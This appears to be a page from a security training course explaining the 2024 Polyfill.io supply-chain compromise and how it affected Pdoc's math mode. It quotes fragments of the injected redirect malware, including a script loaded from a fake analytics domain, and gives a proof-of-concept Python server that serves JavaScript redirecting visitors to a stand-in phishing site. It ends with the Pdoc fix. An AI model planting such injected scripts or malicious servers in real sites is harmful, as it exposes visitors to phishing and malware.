@@ -1,0 +1,1045 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://example.com/05-Third-Party-Libraries/3-1-Real-Example/">
+      
+      
+        <link rel="prev" href="../2-Content/">
+      
+      
+        <link rel="next" href="../3-2-Real-Example/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.12">
+    
+    
+      
+        <title>Real Example 1 - My Docs</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.2afb09e1.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#pdoc-and-polyfillio" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="My Docs" class="md-header__button md-logo" aria-label="My Docs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My Docs
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Real Example 1
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="My Docs" class="md-nav__button md-logo" aria-label="My Docs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    My Docs
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Welcome to MkDocs
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    01 API Authentication
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            01 API Authentication
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-API-Authentication/0-Overview/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Overview
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-API-Authentication/1-Background/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introduction to API authentication
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-API-Authentication/2-1-JWTs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introduction to JSON Web Tokens
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-API-Authentication/2-2-Broken-Authentication/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Broken authentication
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-API-Authentication/3-1-Real-Example/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Real Example 1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-API-Authentication/3-2-Real-Example/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Real Example 2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-API-Authentication/4-1-MCQ-Practice/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Practice
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-API-Authentication/4-2-Lab-Practice/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Practice
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-API-Authentication/Merged/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introduction to API authentication
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    05 Third Party Libraries
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            05 Third Party Libraries
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../0-Overview/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Overview
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2-Content/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introduction to third party libraries
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Real Example 1
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Real Example 1
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#pdoc-and-polyfillio" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pdoc and Polyfill.io
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#polyfills" class="md-nav__link">
+    <span class="md-ellipsis">
+      Polyfills
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#polyfillio" class="md-nav__link">
+    <span class="md-ellipsis">
+      Polyfill.io
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pdoc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pdoc
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#proof-of-concept" class="md-nav__link">
+    <span class="md-ellipsis">
+      Proof of Concept
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mitigations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mitigations
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3-2-Real-Example/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Real Example 2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../4-1-MCQ-Practice/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Practice
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../4-2-Lab-Practice/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Practice
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Merged/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introduction to third party libraries
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#pdoc-and-polyfillio" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pdoc and Polyfill.io
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#polyfills" class="md-nav__link">
+    <span class="md-ellipsis">
+      Polyfills
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#polyfillio" class="md-nav__link">
+    <span class="md-ellipsis">
+      Polyfill.io
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pdoc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pdoc
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#proof-of-concept" class="md-nav__link">
+    <span class="md-ellipsis">
+      Proof of Concept
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mitigations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mitigations
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>Real Example 1</h1>
+
+<h2 id="pdoc-and-polyfillio">Pdoc and Polyfill.io</h2>
+<p>Third-party libraries are pre-built components that developers can integrate into their projects to simplify complex tasks and speed up development. However, they come with inherent risks, as they are created and maintained outside the project. If third-party libraries are not maintained properly, they can introduce vulnerabilities that can be exploited by malicious users.</p>
+<p>To understand the risks associated with third-party libraries, we will explore a real example involving Pdoc and <code>Polyfill.io</code>. Pdoc is a Python library used to generate documentation, and it relied on the <code>Polyfill.io</code> CDN to ensure compatibility across browsers. In this real example, we will learn how <code>Polyfill.io</code> was compromised to inject code in applications like Pdoc.</p>
+<h2 id="polyfills">Polyfills</h2>
+<p>In software development, a polyfill is code that implements a new standard feature in an old environment. This is a common practice done on older browsers to add support for modern features. For example, if a browser lacks support for a specific JavaScript function or HTML element, a polyfill can mimic that function, giving users of older browsers the same experience.</p>
+<p>Let's say we need to use the <code>Math.trunc</code> function. This would "cut off" the decimal part of an integer. For example, <code>Math.trunc(1.23)</code> returns <code>1</code>. However, older browsers might not support this function. To add support, we could implement a polyfill to mimic the <code>Math.trunc</code> function.</p>
+<pre><code class="language-javascript">// Check if Math.trunc is supported
+if (!Math.trunc) {
+    // Implement the polyfill
+    Math.trunc = function(number) {
+        return number &lt; 0 ? Math.ceil(number) : Math.floor(number);
+    }
+}
+</code></pre>
+<p>In general, polyfills are particularly valuable in a rapidly evolving ecosystem, where maintaining broad compatibility is essential to reach large user bases.</p>
+<h2 id="polyfillio">Polyfill.io</h2>
+<p><code>Polyfill.io</code> was one service designed to simplify the use of polyfills. It provided a solution that delivered only necessary scripts based on the specific features needed by the user's browser. This tool proved to be convenient for developers aiming to reach users with low overhead.</p>
+<p>Developers would integrate <code>Polyfill.io</code> by adding a script tag in their HTML files. This script would dynamically fetch the appropriate polyfills, but developers could also indicate the particular features they needed like <code>ES6</code>.</p>
+<pre><code class="language-html">&lt;script src=&quot;https://polyfill.io/v3/polyfill.min.js?features=es6&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>However, the original author of <code>Polyfill.io</code> never owned the domain name. Without influence over its sale, <code>Polyfill.io</code> was eventually sold to a Chinese company called Funnull in February 2024. On June 25, 2024, the Sansec forensics team reported a supply chain attack on <code>Polyfill.io</code> after the service started redirecting users to malicious sites and injecting malware.</p>
+<p>The people that were targeted in this attack were mobile users. When these users accessed compromised websites, the injected code would first check what device they were using to set up an appropriate redirection URL.</p>
+<pre><code class="language-javascript">function check_tiaozhuan() {
+  var _isMobile = navigator.userAgent.match(
+    /(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i
+  );
+  if (_isMobile) {
+    var _curHost = window.location.host,
+      _ref = document.referrer,
+      _redirectURL = &quot;&quot;,
+      _kuurzaBitGet = &quot;https://kuurza.com/redirect?from=bitget&quot;,
+      _rnd = Math.floor(Math.random() * 100 + 1),
+      _date = new Date(),
+      _hours = _date.getHours();
+</code></pre>
+<p>Before the user is redirected, the <code>vfed_update</code> function would load a script from a fake Google Analytics domain and redirect if <code>usercache</code> is true.</p>
+<pre><code class="language-javascript">function vfed_update(_0x5ae1f8) {
+  _0x5ae1f8 !== &quot;&quot; &amp;&amp;
+    loadJS(
+      &quot;https://www.googie-anaiytics.com/html/checkcachehw.js&quot;,
+      function () {
+        if (usercache == true) {
+          window.location.href = _0x5ae1f8;
+        }
+      }
+    );
+}
+</code></pre>
+<p>By targeting a widely used service like Polyfill.io, the attackers managed to inject malware and exploit more than 100 thousand websites. This highlights the importance of continuously monitoring third-party libraries to be safe.</p>
+<h2 id="pdoc">Pdoc</h2>
+<p>In the context of Pdoc, a Python library used to generate documentation, one of the features they included was a math render mode using MathJax. This was particular useful for users that required precise math notation.</p>
+<pre><code class="language-bash"># Enable math mode with --math flag
+pdoc --math example.py
+</code></pre>
+<p>However, Pdoc was vulnerable because they relied on <code>Polyfill.io</code> to provide polyfills for browsers that lacked support for modern features required by MathJax. When users enabled math mode, the HTML output included a script tag that loaded <code>Polyfill.io</code>, recommended by MathJax.</p>
+<pre><code class="language-html">{# This template is included in math mode and loads MathJax for formula rendering. #}
+
+...
+
+&lt;script src=&quot;https://polyfill.io/v3/polyfill.min.js?features=es6&quot;&gt;&lt;/script&gt;
+&lt;script id=&quot;MathJax-script&quot; async src=&quot;https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>As a result, users of Pdoc who enabled math mode had harmful code injected after <code>Polyfill.io</code> was compromised.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>To better understand how Pdoc users were impacted, we can create a compromised server to simulate how malicious JavaScript was injected. We start by creating a simple Python program to act as the victim of this attack.</p>
+<pre><code class="language-python"># Save this as example.py
+def example_function():
+    &quot;&quot;&quot;
+    This is am example function.
+    &quot;&quot;&quot;
+    pass
+</code></pre>
+<p>Then, we install a vulnerable version of Pdoc and use Pdoc to generate documentation with math mode enabled for the victim website.</p>
+<pre><code class="language-bash">python -m pip install pdoc==14.5.0
+</code></pre>
+<pre><code class="language-bash">python -m pdoc --math example.py -o ./docs
+</code></pre>
+<p>In the HTML output, we can then modify <code>example.html</code> by replacing the <code>Polyfill.io</code> link with our own server at <code>http://localhost:8000</code>.</p>
+<pre><code class="language-html">&lt;!-- Find the following line in your generated HTML --&gt; 
+&lt;script src=&quot;https://polyfill.io/v3/polyfill.min.js?features=es6&quot;&gt;&lt;/script&gt; 
+
+&lt;!-- Replace it with --&gt;
+&lt;script src=&quot;http://localhost:8000&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>To exploit the vulnerability in the victim program, we can create a script that sets up a malicious HTTP server using Python's <code>http.server</code> and <code>socketserver</code> modules. This will listen for GET requests and inject harmful code when the victim website is loaded in the user's browser.</p>
+<pre><code class="language-python">import http.server
+import socketserver
+
+class MaliciousHandler(http.server.SimpleHTTPRequestHandler):
+
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header(&quot;Content-type&quot;, &quot;application/javascript&quot;)
+        self.end_headers()
+
+        # Malicious JavaScript payload
+        malicious_js = &quot;&quot;&quot;
+        (function() {
+            // Redirect to phishing site after 10 seconds
+            setTimeout(function() {
+                window.location.href = 'http://phishing-site.example.com';
+            }, 10000);
+        })();
+        &quot;&quot;&quot;
+        self.wfile.write(malicious_js.encode('utf-8'))
+
+
+if __name__ == &quot;__main__&quot;:
+    with socketserver.TCPServer((&quot;&quot;, 8000), MaliciousHandler) as httpd:
+        print(&quot;Serving malicious script at port 8000&quot;)
+        httpd.serve_forever()
+</code></pre>
+<p>In this example, we redirect the user to another website after some time. This simulates a simplified version of the attack done by <code>Polyfill.io</code>.</p>
+<p><img alt="image" src="https://ik.imagekit.io/14sfaswy6hrz/images/clyc2v0ncxs2f1gmw0kwpbyzo.png" /></p>
+<h2 id="mitigations">Mitigations</h2>
+<p>To address the attacks done by <code>Polyfill.io</code>, the maintainers of Pdoc decided to remove the reference to <code>Polyfill.io</code> entirely. This was done to ensure no vulnerabilities are included in the documentation output.</p>
+<pre><code class="language-diff">{# This template is included in math mode and loads MathJax for formula rendering. #}
+
+...
+
+- &lt;script src=&quot;https://polyfill.io/v3/polyfill.min.js?features=es6&quot;&gt;&lt;/script&gt;
+&lt;script id=&quot;MathJax-script&quot; async src=&quot;https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>As a result, users can now determine if they need polyfills in their documentation and do not need to depend on <code>Polyfill.io</code> specifically.</p>
+<p>The real example involving Pdoc and <code>Polyfill.io</code> demonstrates how third-party libraries can introduce vulnerabilities that compromise the application. By staying on top of updates and security patches on the libraries we use, we can protect our applications from similar threats.</p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant"], "search": "../../assets/javascripts/workers/search.f8cc74c7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.c8b220af.min.js"></script>
+      
+    
+  </body>
+</html>
